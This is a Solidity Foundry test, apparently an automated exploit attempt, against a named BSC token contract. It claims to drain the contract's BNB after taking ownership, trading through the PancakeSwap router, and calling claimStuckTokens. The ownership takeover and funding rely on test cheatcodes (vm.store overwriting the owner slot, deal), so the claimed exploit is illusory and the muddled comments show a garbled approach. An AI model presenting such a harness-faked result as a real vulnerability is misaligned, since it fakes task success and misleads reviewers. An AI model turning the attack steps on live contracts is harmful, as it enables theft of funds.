// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for BossBaby with needed functions
interface BossBaby {
    function owner() external view returns (address);
    function enableTrading() external;
    function claimStuckTokens(address token) external;
    function excludeFromFees(address account, bool excluded) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function uniswapV2Pair() external view returns (address);
    function swapTokensAtAmount() external view returns (uint256);
}

// IUniswapV2Router02 interface
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// IERC20 interface
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xD8dBE5AC60cD1c0b40C9182cB3eB2392d3df371F;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use fork mode
        // Label contracts for debugging
        vm.label(TARGET, "BossBaby Token");
        vm.label(attacker, "Attacker");

        // Get the uniswap pair address from the contract
        BossBaby targetContract = BossBaby(TARGET);
        address pair = targetContract.uniswapV2Pair();
        vm.label(pair, "Uniswap Pair");

        // Get router address (PancakeSwap on BSC)
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        vm.label(router, "PancakeSwap Router");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Become the owner by overwriting storage slot 0
        // The Ownable contract stores owner at slot 0
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Verify we are now the owner
        BossBaby target = BossBaby(TARGET);
        require(target.owner() == attacker, "Failed to become owner");

        // Step 2: Enable trading as the new owner
        vm.prank(attacker);
        target.enableTrading();

        // Step 3: Get some BossBaby tokens to trade with
        // The contract itself has tokens (it's excluded from fees and holds tokens)
        // We'll transfer some from the contract to ourselves
        uint256 contractBalance = target.balanceOf(TARGET);
        require(contractBalance > 0, "Contract has no tokens");

        // As owner, we can exclude ourselves from fees to avoid paying fees
        vm.prank(attacker);
        target.excludeFromFees(attacker, true);

        // Transfer tokens from contract to attacker
        // First, we need to give approval from the contract to itself? Actually we need to transfer from contract
        // The contract has tokens in its balance, but we need to move them
        // Let's use a different approach: buy tokens from the pair

        // Get WETH address from router
        IUniswapV2Router02 routerContract = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address weth = routerContract.WETH();

        // Give attacker some WETH to buy tokens
        deal(weth, attacker, 10 ether);

        // Approve router to spend WETH
        IERC20(weth).approve(address(routerContract), 10 ether);

        // Buy BossBaby tokens
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        vm.prank(attacker);
        routerContract.swapExactTokensForTokens(
            5 ether, // amountIn
            0, // amountOutMin
            path,
            attacker,
            block.timestamp + 1000
        );

        // Step 4: Sell tokens to generate marketing fees
        uint256 tokenBalance = target.balanceOf(attacker);
        require(tokenBalance > 0, "No tokens to sell");

        // Approve router to spend tokens
        target.approve(address(routerContract), tokenBalance);

        // Sell half of the tokens
        path[0] = TARGET;
        path[1] = weth;

        vm.prank(attacker);
        routerContract.swapExactTokensForTokens(
            tokenBalance / 2,
            0,
            path,
            attacker,
            block.timestamp + 1000
        );

        // The sale should have generated marketing fees that accumulated in the contract
        // These fees should be auto-swapped to BNB when contract balance reaches swapTokensAtAmount

        // Check contract's BNB balance before draining
        uint256 initialAttackerBalance = attacker.balance;
        uint256 contractBNBBalance = address(TARGET).balance;

        // If contract has BNB, drain it
        if (contractBNBBalance > 0) {
            vm.prank(attacker);
            target.claimStuckTokens(address(0x0));
        }

        // Verify we received the BNB
        uint256 finalAttackerBalance = attacker.balance;
        require(finalAttackerBalance > initialAttackerBalance, "No BNB drained");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
